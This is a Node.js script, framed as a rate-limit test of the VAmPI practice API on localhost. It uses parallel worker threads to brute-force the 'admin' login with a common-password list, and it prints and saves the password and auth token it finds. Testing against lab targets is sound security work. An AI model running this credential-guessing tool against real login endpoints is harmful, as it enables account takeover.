import http from 'http';
import https from 'https';
import fs from 'fs';
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';
import { performance } from 'perf_hooks';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ==================== CONFIGURAÇÃO ====================
const CONFIG = {
    API_URL: 'http://localhost:5002',
    LOGIN_ENDPOINT: '/users/v1/login',
    NUM_WORKERS: 6,
    CSV_FILE: 'passwords.csv',
    DELAY_BETWEEN_REQUESTS: 0,
    REQUEST_TIMEOUT: 1000,
    USERNAME: 'admin',
    STOP_ON_FIND: true,
    VERIFY_RESPONSE: true,
    WORKER_STOP_TIMEOUT: 100 // ms para workers pararem após encontrar
};

// ==================== FUNÇÕES COMPARTILHADAS ====================

// Variável global para controle de parada
let globalStopFlag = false;

// Função para fazer requisição HTTP
function makeRequest(url, data, timeout = 5000) {
    return new Promise((resolve) => {
        const urlObj = new URL(url);
        const isHttps = urlObj.protocol === 'https:';
        const client = isHttps ? https : http;

        const postData = JSON.stringify(data);

        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (isHttps ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'RateLimitTest/1.0'
            },
            timeout: timeout
        };

        const req = client.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                let parsedData = null;
                let isLoginSuccess = false;
                let authToken = null;

                try {
                    parsedData = JSON.parse(responseData);

                    if (parsedData.status === 'success' && parsedData.auth_token) {
                        isLoginSuccess = true;
                        authToken = parsedData.auth_token;
                    }
                } catch (e) {
                    // Não é JSON
                }

                const isSuccess = res.statusCode >= 200 && res.statusCode < 300;

                resolve({
                    success: isSuccess && isLoginSuccess,
                    statusCode: res.statusCode,
                    data: responseData,
                    parsedData: parsedData,
                    isLoginSuccess: isLoginSuccess,
                    authToken: authToken,
                    headers: res.headers
                });
            });
        });

        req.on('error', (error) => {
            resolve({
                success: false,
                statusCode: 0,
                error: error.message,
                data: null
            });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({
                success: false,
                statusCode: 408,
                error: 'Timeout',
                data: null
            });
        });

        req.write(postData);
        req.end();
    });
}

// Função para ler CSV de senhas
function readPasswordList(csvFile) {
    try {
        const filePath = path.join(__dirname, csvFile);
        if (!fs.existsSync(filePath)) {
            console.log(`Arquivo ${csvFile} não encontrado. Criando arquivo de exemplo...`);
            const examplePasswords = [
                'password', '123456', '123456789', 'qwerty', 'password123',
                'admin', 'letmein', '12345', 'qwerty123', '1q2w3e',
                '1234567890', 'admin123', 'password1', '1234', '1234567',
                '12345678', 'abc123', 'password1234', 'qwertyuiop', 'password!',
                '123456789', 'admin123', 'password123', '123', 'abc123',
                '123456', 'password', '111111', '123456789', 'qwerty'
            ];
            fs.writeFileSync(filePath, examplePasswords.join('\n'));
            console.log(`Arquivo de exemplo criado: ${filePath}`);
            return examplePasswords;
        }

        const data = fs.readFileSync(filePath, 'utf8');
        const lines = data.split('\n')
            .map(line => line.trim())
            .filter(line => line !== '' && !line.startsWith('#'));

        const hasHeader = lines.length > 0 &&
            (lines[0].toLowerCase().includes('password') ||
                lines[0].toLowerCase().includes('senha') ||
                lines[0].toLowerCase().includes('pass'));

        const startIndex = hasHeader ? 1 : 0;
        const passwords = [];

        for (let i = startIndex; i < lines.length; i++) {
            const parts = lines[i].split(',');
            const password = parts[0].trim();
            if (password && password.length > 0) {
                passwords.push(password);
            }
        }

        return passwords;
    } catch (error) {
        console.error(`Erro ao ler arquivo CSV: ${error.message}`);
        return [];
    }
}

// ==================== WORKER THREAD ====================

if (!isMainThread) {
    const { workerId, passwords, config } = workerData;
    let shouldStop = false;
    let foundPassword = null;
    let foundAuthToken = null;

    async function runWorker() {
        const startTime = performance.now();
        let success = 0;
        let failure = 0;
        let totalRequests = 0;
        let firstSuccess = null;
        let errors = [];
        let attempts = [];
        let foundInfo = null;

        parentPort.postMessage({
            type: 'progress',
            message: `Worker ${workerId} iniciado com ${passwords.length} senhas`
        });

        for (let i = 0; i < passwords.length; i++) {
            // Verifica se deve parar ANTES de cada requisição
            if (shouldStop || globalStopFlag) {
                parentPort.postMessage({
                    type: 'progress',
                    message: `Worker ${workerId} parado (${foundPassword ? 'senha encontrada' : 'comando externo'})`
                });
                break;
            }

            const password = passwords[i];
            totalRequests++;

            const url = `${config.API_URL}${config.LOGIN_ENDPOINT}`;
            const data = {
                username: config.USERNAME,
                password: password
            };

            const result = await makeRequest(url, data, config.REQUEST_TIMEOUT);

            attempts.push({
                password,
                statusCode: result.statusCode,
                success: result.success,
                isLoginSuccess: result.isLoginSuccess,
                hasAuthToken: !!result.authToken,
                timestamp: new Date().toISOString()
            });

            // Verificar se o login foi bem-sucedido
            if (result.isLoginSuccess && result.authToken) {
                success++;
                if (firstSuccess === null) {
                    firstSuccess = (performance.now() - startTime) / 1000;
                }
                foundPassword = password;
                foundAuthToken = result.authToken;
                foundInfo = {
                    password: password,
                    authToken: result.authToken,
                    attempts: totalRequests,
                    time: firstSuccess,
                    workerId: workerId
                };

                // ENVIA O ENCONTRO IMEDIATAMENTE
                parentPort.postMessage({
                    type: 'found',
                    ...foundInfo,
                    responseData: result.data
                });

                // Marca para parar
                shouldStop = true;
                globalStopFlag = true;

                // Para imediatamente o loop
                break;
            } else {
                failure++;

                if (result.statusCode === 429 || result.statusCode === 403) {
                    errors.push({
                        password,
                        statusCode: result.statusCode,
                        error: result.error || 'Rate limit'
                    });
                }
            }

            // Log de progresso
            if (totalRequests % 10 === 0 || totalRequests === passwords.length) {
                parentPort.postMessage({
                    type: 'progress',
                    message: `Worker ${workerId}: ${totalRequests}/${passwords.length} (${success} OK, ${failure} FAIL)`
                });
            }

            if (config.DELAY_BETWEEN_REQUESTS > 0) {
                await new Promise(resolve => setTimeout(resolve, config.DELAY_BETWEEN_REQUESTS));
            }
        }

        const endTime = performance.now();
        const executionTime = (endTime - startTime) / 1000;

        const result = {
            workerId,
            totalRequests,
            success,
            failure,
            firstSuccess,
            executionTime,
            foundPassword,
            foundAuthToken,
            errors: errors.slice(0, 10),
            attempts: attempts.slice(0, 20),
            stopped: shouldStop || globalStopFlag
        };

        parentPort.postMessage({
            type: 'result',
            data: result
        });
    }

    // Listener para mensagens do main thread
    parentPort.on('message', (message) => {
        if (message === 'stop') {
            shouldStop = true;
            globalStopFlag = true;
            parentPort.postMessage({
                type: 'progress',
                message: `Worker ${workerId} recebeu comando de parada`
            });
        }
    });

    runWorker().catch(error => {
        parentPort.postMessage({
            type: 'result',
            data: {
                workerId,
                totalRequests: 0,
                success: 0,
                failure: 0,
                firstSuccess: null,
                executionTime: 0,
                foundPassword: null,
                foundAuthToken: null,
                error: error.message,
                stopped: true
            }
        });
    });
}

// ==================== MAIN THREAD ====================

if (isMainThread) {

    function distributePasswords(passwords, numWorkers) {
        const chunks = [];
        const chunkSize = Math.ceil(passwords.length / numWorkers);

        for (let i = 0; i < numWorkers; i++) {
            const start = i * chunkSize;
            const end = Math.min(start + chunkSize, passwords.length);
            if (start < passwords.length) {
                chunks.push(passwords.slice(start, end));
            }
        }

        return chunks;
    }

    async function runWorkers(passwordChunks) {
        const startTime = performance.now();
        const results = {
            success: 0,
            failure: 0,
            totalRequests: 0,
            workersResults: [],
            rateLimits: [],
            foundPassword: null,
            foundAuthToken: null,
            foundByWorker: null,
            foundAtTime: null,
            foundAttempts: null,
            stoppedEarly: false
        };

        const workers = [];
        let foundResolved = false;

        console.log(`\n🚀 Iniciando ${passwordChunks.length} workers...`);
        console.log(`🔍 STOP_ON_FIND: ${CONFIG.STOP_ON_FIND ? 'ATIVADO' : 'DESATIVADO'}`);
        console.log(`👤 Usuário alvo: ${CONFIG.USERNAME}`);
        console.log(`📝 Verificando resposta da API (formato VAmPI)\n`);

        // Cria uma Promise que resolve quando encontrar a senha
        const foundPromise = new Promise((resolve) => {
            // Será resolvida quando um worker encontrar a senha
            const checkFound = (message) => {
                if (message.type === 'found' && !foundResolved) {
                    foundResolved = true;
                    results.foundPassword = message.password;
                    results.foundAuthToken = message.authToken;
                    results.foundByWorker = message.workerId;
                    results.foundAtTime = message.time;
                    results.foundAttempts = message.attempts;
                    results.stoppedEarly = true;

                    console.log(`\n🎯🎯🎯 SENHA ENCONTRADA! 🎯🎯🎯`);
                    console.log(`🔑 Senha: ${message.password}`);
                    console.log(`🔐 Token: ${message.authToken ? message.authToken.substring(0, 30) + '...' : 'N/A'}`);
                    console.log(`👷 Worker: ${message.workerId}`);
                    console.log(`⏱️  Tempo: ${message.time.toFixed(2)} segundos`);
                    console.log(`📊 Tentativas: ${message.attempts}`);
                    console.log(`\n🛑 Parando todos os workers...\n`);

                    // Para todos os workers imediatamente
                    workers.forEach(w => {
                        try {
                            w.postMessage('stop');
                        } catch (e) {
                            // Ignora erros ao postar mensagem
                        }
                    });

                    resolve({
                        found: true,
                        ...message
                    });
                }
            };

            // Armazena a função para uso posterior
            global.__checkFound = checkFound;
        });

        // Cria os workers
        passwordChunks.forEach((chunk, index) => {
            const worker = new Worker(__filename, {
                workerData: {
                    workerId: index + 1,
                    passwords: chunk,
                    config: CONFIG
                }
            });

            workers.push(worker);

            const workerPromise = new Promise((resolve, reject) => {
                let resolved = false;

                worker.on('message', (message) => {
                    // Verifica se encontrou
                    if (message.type === 'found') {
                        global.__checkFound(message);
                    }

                    if (message.type === 'progress') {
                        console.log(`📊 ${message.message}`);
                    } else if (message.type === 'result') {
                        if (!resolved) {
                            resolved = true;
                            resolve(message.data);
                        }
                    }
                });

                worker.on('error', (error) => {
                    console.error(`❌ Erro no worker ${index + 1}:`, error);
                    if (!resolved) {
                        resolved = true;
                        reject(error);
                    }
                });

                worker.on('exit', (code) => {
                    if (code !== 0 && !resolved) {
                        resolved = true;
                        reject(new Error(`Worker ${index + 1} finalizou com código ${code}`));
                    }
                });
            });

            // Race entre o worker e o foundPromise
            const racePromise = Promise.race([
                workerPromise,
                foundPromise.then(() => {
                    // Se foundPromise resolver, retorna um resultado especial
                    return {
                        workerId: index + 1,
                        stopped: true,
                        foundByOther: true
                    };
                })
            ]);

            promises.push(racePromise);
        });

        // Aguarda todos os workers ou o primeiro que encontrar
        try {
            const workerResults = await Promise.all(promises);
            const endTime = performance.now();

            // Processa os resultados
            workerResults.forEach(result => {
                if (result && !result.stopped) {
                    results.success += result.success || 0;
                    results.failure += result.failure || 0;
                    results.totalRequests += result.totalRequests || 0;
                    results.workersResults.push(result);
                    if (result.errors) {
                        results.rateLimits.push(...result.errors);
                    }
                } else if (result && result.foundByOther) {
                    // Worker foi parado porque outro encontrou
                } else if (result && result.foundPassword) {
                    // Worker encontrou a senha
                    results.totalRequests += result.totalRequests || 0;
                    results.workersResults.push(result);
                }
            });

            results.totalTime = (endTime - startTime) / 1000;
            results.requestsPerSecond = results.totalRequests / results.totalTime;

            return results;
        } catch (error) {
            console.error('❌ Erro durante execução dos workers:', error);
            throw error;
        }
    }

    async function main() {
        console.log('\n' + '='.repeat(60));
        console.log('🔒 TESTE DE RATE LIMIT - VAmPI');
        console.log('='.repeat(60));
        console.log(`📍 API URL: ${CONFIG.API_URL}`);
        console.log(`👷 Número de workers: ${CONFIG.NUM_WORKERS}`);
        console.log(`📁 Arquivo CSV: ${CONFIG.CSV_FILE}`);
        console.log(`👤 Usuário: ${CONFIG.USERNAME}`);
        console.log(`🛑 Parar ao encontrar: ${CONFIG.STOP_ON_FIND ? 'SIM' : 'NÃO'}`);
        console.log('='.repeat(60) + '\n');

        console.log('📖 Lendo arquivo de senhas...');
        const passwords = readPasswordList(CONFIG.CSV_FILE);

        if (passwords.length === 0) {
            console.error('❌ Nenhuma senha encontrada no arquivo CSV.');
            process.exit(1);
        }

        console.log(`✅ Total de senhas carregadas: ${passwords.length}\n`);

        const passwordChunks = distributePasswords(passwords, CONFIG.NUM_WORKERS);
        console.log('📦 Distribuição de senhas:');
        passwordChunks.forEach((chunk, index) => {
            console.log(`   Worker ${index + 1}: ${chunk.length} senhas`);
        });
        console.log('\n');

        console.log('⏳ Iniciando teste de rate limit...\n');
        const results = await runWorkers(passwordChunks);

        // ==================== EXIBIR RESULTADOS ====================
        console.log('\n' + '='.repeat(60));
        console.log('📊 RESULTADOS DO TESTE');
        console.log('='.repeat(60));

        if (results.foundPassword) {
            console.log('\n🎯🎯🎯 SENHA ENCONTRADA COM SUCESSO! 🎯🎯🎯');
            console.log(`🔑 Senha correta: ${results.foundPassword}`);
            console.log(`🔐 Auth Token: ${results.foundAuthToken ? results.foundAuthToken.substring(0, 50) + '...' : 'N/A'}`);
            console.log(`👷 Encontrada pelo Worker: ${results.foundByWorker}`);
            console.log(`⏱️  Tempo decorrido: ${results.foundAtTime.toFixed(2)} segundos`);
            console.log(`📊 Tentativas até encontrar: ${results.foundAttempts}`);
            console.log('='.repeat(60) + '\n');
        } else {
            console.log('\n❌ Nenhuma senha válida foi encontrada.');
            console.log('💡 Verifique:');
            console.log('   1. Se a API VAmPI está rodando em localhost:5001');
            console.log('   2. Se o endpoint de login é /login');
            console.log('   3. Se o usuário "admin" existe na base');
            console.log('   4. Se a senha correta está na lista de senhas\n');
        }

        console.log(`⏱️  Tempo total de execução: ${results.totalTime.toFixed(2)} segundos`);
        console.log(`📨 Total de requisições: ${results.totalRequests}`);
        console.log(`✅ Sucessos (logins válidos): ${results.success}`);
        console.log(`❌ Falhas: ${results.failure}`);
        console.log(`⚡ Requisições por segundo: ${results.requestsPerSecond.toFixed(2)}`);
        console.log(`🛑 Parou antecipadamente: ${results.stoppedEarly ? 'SIM (senha encontrada)' : 'NÃO'}`);

        // Detalhes por worker
        console.log('\n📋 Detalhes por Worker:');
        console.log('-'.repeat(40));
        results.workersResults.forEach((result, index) => {
            if (result.foundPassword) {
                console.log(`Worker ${result.workerId}: 🔑 ENCONTROU A SENHA!`);
                console.log(`  🔑 Senha: ${result.foundPassword}`);
                console.log(`  ⏱️  Tempo: ${result.firstSuccess?.toFixed(2) || 'N/A'}s`);
                console.log(`  📊 Tentativas: ${result.totalRequests}`);
            } else if (result.stopped) {
                console.log(`Worker ${result.workerId}: ⏹️  Parado (senha encontrada por outro worker)`);
            } else {
                const successRate = result.totalRequests > 0 ?
                    (result.success / result.totalRequests * 100).toFixed(2) : 0;

                console.log(`Worker ${result.workerId}:`);
                console.log(`  Requisições: ${result.totalRequests}`);
                console.log(`  ✅ Sucessos: ${result.success}`);
                console.log(`  ❌ Falhas: ${result.failure}`);
                console.log(`  📊 Taxa de sucesso: ${successRate}%`);
                if (result.firstSuccess) {
                    console.log(`  🎯 Primeiro sucesso: ${result.firstSuccess.toFixed(2)}s`);
                }
                console.log(`  ⏱️  Tempo execução: ${result.executionTime.toFixed(2)}s`);
                console.log(`  ⚡ Req/segundo: ${(result.totalRequests / result.executionTime).toFixed(2)}`);
                if (result.errors && result.errors.length > 0) {
                    console.log(`  🚫 Rate limits: ${result.errors.length}`);
                }
            }
            console.log('-'.repeat(40));
        });

        // Análise de rate limit
        console.log('\n🔍 ANÁLISE DE RATE LIMIT:');
        console.log('-'.repeat(40));

        const failureRate = results.totalRequests > 0 ?
            (results.failure / results.totalRequests * 100) : 0;

        console.log(`📊 Taxa de falha total: ${failureRate.toFixed(2)}%`);

        const rateLimitErrors = results.rateLimits || [];
        if (rateLimitErrors.length > 0) {
            console.log(`🚫 Rate limits detectados: ${rateLimitErrors.length}`);

            const statusCount = {};
            rateLimitErrors.forEach(err => {
                const status = err.statusCode || 'unknown';
                statusCount[status] = (statusCount[status] || 0) + 1;
            });

            console.log('📊 Códigos de status encontrados:');
            Object.keys(statusCount).forEach(status => {
                console.log(`   ${status}: ${statusCount[status]} vezes`);
            });
        }

        console.log('\n' + '='.repeat(60));
        if (results.foundPassword) {
            console.log(`✅ SENHA ENCONTRADA: ${results.foundPassword}`);
            console.log(`   Tentativas: ${results.foundAttempts}`);
            console.log(`   Tempo: ${results.foundAtTime.toFixed(2)} segundos`);
            console.log(`   Worker: ${results.foundByWorker}`);
        } else if (failureRate > 20) {
            console.log('⚠️  RATE LIMIT DETECTADO! A API está limitando requisições.');
            console.log(`   Taxa de falha: ${failureRate.toFixed(2)}%`);
        } else if (failureRate > 5) {
            console.log('⚠️  POSSÍVEL RATE LIMIT detectado.');
            console.log(`   Taxa de falha: ${failureRate.toFixed(2)}%`);
        } else {
            console.log('✅ SEM INDÍCIOS FORTES de rate limit.');
            console.log(`   Taxa de falha: ${failureRate.toFixed(2)}%`);
        }
        console.log('='.repeat(60) + '\n');

        // Salvar relatório
        const report = {
            timestamp: new Date().toISOString(),
            config: CONFIG,
            results: {
                foundPassword: results.foundPassword,
                foundAuthToken: results.foundAuthToken ? results.foundAuthToken.substring(0, 50) + '...' : null,
                foundByWorker: results.foundByWorker,
                foundAtTime: results.foundAtTime,
                foundAttempts: results.foundAttempts,
                totalRequests: results.totalRequests,
                success: results.success,
                failure: results.failure,
                failureRate: failureRate,
                totalTime: results.totalTime,
                requestsPerSecond: results.requestsPerSecond,
                stoppedEarly: results.stoppedEarly,
                workers: results.workersResults.map(w => ({
                    workerId: w.workerId,
                    totalRequests: w.totalRequests,
                    success: w.success,
                    failure: w.failure,
                    foundPassword: w.foundPassword || null,
                    executionTime: w.executionTime,
                    stopped: w.stopped || false
                }))
            }
        };

        const reportFile = `rate-limit-report-${Date.now()}.json`;
        fs.writeFileSync(reportFile, JSON.stringify(report, null, 2));
        console.log(`📄 Relatório salvo em: ${reportFile}`);
    }

    const promises = [];
    main().catch(error => {
        console.error('❌ Erro fatal:', error);
        process.exit(1);
    });
}